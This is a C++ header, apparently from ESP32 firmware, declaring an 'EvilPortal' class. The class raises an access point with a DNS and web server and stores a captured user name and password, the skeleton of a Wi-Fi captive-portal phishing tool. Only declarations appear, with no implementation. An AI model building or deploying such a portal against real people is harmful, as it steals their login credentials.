#ifndef EvilPortal_h
#define EvilPortal_h

#include "ESPAsyncWebServer.h"
#include <AsyncTCP.h>
#include <DNSServer.h>

#include "configs.h"
#include "settings.h"
#include "WiFiScan.h"

extern Settings settings_obj;
extern WiFiScan wifi_scan_obj;

#define WAITING 0
#define GOOD 1
#define BAD 2

#define SET_HTML_CMD "sethtml="
#define SET_AP_CMD "setap="
#define RESET_CMD "reset"
#define START_CMD "start"
#define ACK_CMD "ack"
#define MAX_HTML_SIZE 20000

class EvilPortal {

  private:
    bool runServer;
    bool name_received;
    bool password_received;
    String user_name;
    String password;

    //DNSServer dnsServer;
    //AsyncWebServer server(80);

    void startPortal();
    void startAP();

  public:
    EvilPortal();

    String get_user_name();
    String get_password();

};

#endif